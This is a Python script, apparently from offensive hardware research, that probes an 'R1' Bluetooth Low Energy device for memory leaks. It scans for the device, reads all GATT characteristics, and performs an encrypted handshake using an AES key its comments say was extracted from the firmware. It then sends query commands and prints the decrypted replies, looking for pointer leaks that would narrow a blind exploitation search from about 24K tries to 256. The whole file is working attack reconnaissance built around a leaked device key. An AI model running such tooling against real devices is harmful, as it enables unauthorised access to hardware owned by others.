#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""R1 BLE 信息泄漏挖掘: GATT 特征枚举 + 读所有可读项
 + 探测查询类指令(0x02/0x03/0x06/0x07/0x0A), 响应全部 AES-GCM 解密打印,
 找含指针/内存内容的回包(用于复核"回包面无泄漏"结论——若有任意指针泄漏,
 盲打空间从 ~24K 坍缩到 256)"""
import asyncio, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

C_WRITE = "0000ffe2-0000-1000-8000-00805f9b34fb"
C_NOTIFY = "0000ffe1-0000-1000-8000-00805f9b34fb"
KEY = bytes.fromhex("85b3f0b12c51dfb5815df26000107d6a")   # R1 固件 aes_key.bin
NAME_PREFIX = "R1_"
MAC = None  # --mac 指定, 否则按名称前缀扫描

def cks(b): return (-sum(b)) & 0xff
def enc(pt):
    n = bytes(range(1, 13)); c = AES.new(KEY, AES.MODE_GCM, nonce=n); ct, tag = c.encrypt_and_digest(pt)
    b = bytes([12]) + n + bytes([16]) + tag + bytes([len(ct)]) + ct; return b + bytes([cks(b)])
def dec(frame):
    i = 0; nl = frame[i]; i += 1; nonce = frame[i:i+nl]; i += nl
    tl = frame[i]; i += 1; tag = frame[i:i+tl]; i += tl
    cl = frame[i]; i += 1; ct = frame[i:i+cl]
    return AES.new(KEY, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)

async def main():
    dev = None
    for _ in range(4):
        for x in await BleakScanner.discover(timeout=8):
            if (MAC and x.address.upper() == MAC.upper()) or (x.name or '').startswith(NAME_PREFIX):
                dev = x; break
        if dev: break
    assert dev, "not found"
    print(f"[*] target {dev.address} {dev.name!r}")
    async with BleakClient(dev, timeout=25) as cli:
        print("=== GATT 特征枚举 ===")
        for svc in cli.services:
            for ch in svc.characteristics:
                props = ch.properties
                line = f"  {ch.uuid} {props}"
                if 'read' in props:
                    try:
                        v = await cli.read_gatt_char(ch.uuid)
                        line += f"  READ={v.hex()} {v!r}"
                    except Exception as ex:
                        line += f"  READ_ERR={ex}"
                print(line)
        notifs = []
        await cli.start_notify(C_NOTIFY, lambda h, d: notifs.append(bytes(d)))
        p = bytes([0x52, 8, 0x0B]) + b"\x00" * 8
        await cli.write_gatt_char(C_WRITE, enc(p + bytes([cks(p)])), response=True); await asyncio.sleep(1.0)
        T = int.from_bytes(dec(notifs[-1])[3:11], 'big'); print(f"[*] T={T}")
        p = bytes([0x52, 0x0c, 0x0C]) + (T + 1).to_bytes(8, 'big') + bytes(4)
        await cli.write_gatt_char(C_WRITE, enc(p + bytes([cks(p)])), response=True); await asyncio.sleep(0.8)
        print("[*] session started")
        for ins in (0x02, 0x03, 0x06, 0x07, 0x0A):
            notifs.clear()
            p = bytes([0x52, 8, ins]) + b"\x00" * 8
            try:
                await cli.write_gatt_char(C_WRITE, enc(p + bytes([cks(p)])), response=True)
            except Exception as ex:
                print(f"ins 0x{ins:02x}: write err {ex}"); continue
            await asyncio.sleep(1.5)
            if notifs:
                for fr in notifs:
                    try:
                        pt = dec(fr); print(f"ins 0x{ins:02x} 响应: {pt.hex()}  {pt!r}")
                    except Exception:
                        print(f"ins 0x{ins:02x} 响应(解密失败): {fr.hex()}")
            else:
                print(f"ins 0x{ins:02x}: 无响应")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        MAC = sys.argv[1]
    asyncio.run(main())
